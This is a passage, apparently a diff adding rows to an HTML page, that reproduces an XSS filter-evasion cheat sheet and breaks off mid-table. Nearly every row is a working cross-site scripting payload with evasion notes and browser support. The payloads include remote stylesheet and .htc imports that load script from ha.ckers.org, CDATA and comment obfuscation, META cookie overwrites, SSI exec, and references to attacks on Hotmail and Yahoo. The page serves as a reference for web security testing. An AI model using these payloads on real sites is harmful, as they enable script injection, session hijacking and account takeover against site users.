+<tr>
+	<td width="90%">Variant Remote Stylesheet 1</td>
+	<td width="10%"><div align="right"><input id="link38" type="button" value="[+] Expand" onClick="toggle_visibility('table38','link38');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table38" name="table38">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Remote Stylesheet 2</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link39" type="button" value="[+] Expand" onClick="toggle_visibility('table39','link39');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table39" name="table39">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Remote style sheet part 2 (this works the same as above, but uses a &lt;STYLE&gt; tag instead of a &lt;LINK&gt; tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Remote Stylesheet 3</td>
+	<td width="10%"><div align="right"><input id="link40" type="button" value="[+] Expand" onClick="toggle_visibility('table40','link40');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table40" name="table40">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: &lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Remote Stylesheet 4</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link41" type="button" value="[+] Expand" onClick="toggle_visibility('table41','link41');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table41" name="table41">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="ns"&gt;IE6.0&lt;/span&gt;|&lt;span class="ns"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant TABLE</td>
+	<td width="10%"><div align="right"><input id="link42" type="button" value="[+] Expand" onClick="toggle_visibility('table42','link42');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table42" name="table42">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;&lt;/TABLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Table background (who would have thought tables were XSS targets... except me, of course).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant TD</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link43" type="button" value="[+] Expand" onClick="toggle_visibility('table43','link43');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table43" name="table43">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;&lt;/TD&gt;&lt;/TABLE&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">TD background.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant XML namespace</td>
+	<td width="10%"><div align="right"><input id="link44" type="button" value="[+] Expand" onClick="toggle_visibility('table44','link44');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table44" name="table44">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;HTML xmlns:xss&gt;
+&lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt;
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+&lt;/HTML&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XML namespace. The .htc file must be located on the server as your XSS vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant XML data island w/CDATA</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link45" type="button" value="[+] Expand" onClick="toggle_visibility('table45','link45');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table45" name="table45">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XML data island with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 IE rendering engine mode) - vector found by Sec Consult http://www.sec-consult.html while auditing Yahoo.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant XML data island w/comment</td>
+	<td width="10%"><div align="right"><input id="link46" type="button" value="[+] Expand" onClick="toggle_visibility('table46','link46');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table46" name="table46">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+
+&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">XML data island with comment obfuscation (doesn't use CDATA fields, but rather uses comments to break up the javascript directive)</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant XML (locally hosted)</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link47" type="button" value="[+] Expand" onClick="toggle_visibility('table47','link47');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table47" name="table47">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;XML SRC="http://ha.ckers.org/xsstest.xml" ID=I&gt;&lt;/XML&gt;
+&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant XML HTML+TIME</td>
+	<td width="10%"><div align="right"><input id="link48" type="button" value="[+] Expand" onClick="toggle_visibility('table48','link48');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table48" name="table48">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML Element Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;HTML&gt;&lt;BODY&gt;
+&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;
+&lt;?import namespace="t" implementation="#default#time2"&gt;
+&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt; &lt;/BODY&gt;&lt;/HTML&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">HTML+TIME in XML. This is how Grey Magic http://www.greymagic.com/security/advisories/gm005-mc/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Commented-out Block</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link49" type="button" value="[+] Expand" onClick="toggle_visibility('table49','link49');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table49" name="table49">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;!--[if gte IE 4]&gt;
+&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
+&lt;![endif]--&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Cookie Manipulation</td>
+	<td width="10%"><div align="right"><input id="link50" type="button" value="[+] Expand" onClick="toggle_visibility('table50','link50');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table50" name="table50">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where &lt;META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant Local .htc file</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link51" type="button" value="[+] Expand" onClick="toggle_visibility('table51','link51');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table51" name="table51">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);"&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="ns"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="ns"&gt;FF1.5&lt;/span&gt;] [&lt;span class="ns"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant Rename .js to .jpg</td>
+	<td width="10%"><div align="right"><input id="link52" type="button" value="[+] Expand" onClick="toggle_visibility('table52','link52');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table52" name="table52">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;SCRIPT SRC="http://ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Assuming you can only fit in a few characters and it filters against ".js" you can rename your JavaScript file to an image as an XSS vector.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant SSI</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link53" type="button" value="[+] Expand" onClick="toggle_visibility('table53','link53');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table53" name="table53">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'"--&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%">Variant PHP</td>
+	<td width="10%"><div align="right"><input id="link54" type="button" value="[+] Expand" onClick="toggle_visibility('table54','link54');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table54" name="table54">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Code<h3></td>
+		<td width="32%" bgcolor="#CCCCCC"><h3>Description</h3></td>
+		<td width="25%" bgcolor="#CCCCCC"><h3>Browser</h3></td>
+	</tr>
+	<tr>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Other Attacks</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">&lt;? echo('&lt;SCR)';
+echo('IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'); ?&gt;</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.</td>
+		<td style="word-wrap: break-word" valign="top" bgcolor="#CCCCCC">Browser support: [&lt;span class="s"&gt;IE6.0&lt;/span&gt;|&lt;span class="s"&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class="s"&gt;NS8.1-G&lt;/span&gt;|&lt;span class="s"&gt;FF1.5&lt;/span&gt;] [&lt;span class="s"&gt;O8.54&lt;/span&gt;]</td>
+	</tr>
+	</table>
+	</td>
+</tr>
+</table>
+<table width="100%" border="0">
+<tr>
+	<td width="90%" height="33" bgcolor="#E6E6E6">Variant JavaScript Includes</td>
+	<td width="10%" height="33" bgcolor="#E6E6E6"><div align="right"><input id="link55" type="button" value="[+] Expand" onClick="toggle_visibility('table55','link55');"></div></td>
+</tr>
+<tr>
+	<td colspan="2">
+	<table style="table-layout: fixed" width="100%" border="0" id="table55" name="table55">
+	<tr>
+		<td width="11%" bgcolor="#CCCCCC"><h3>Label</h3></td>
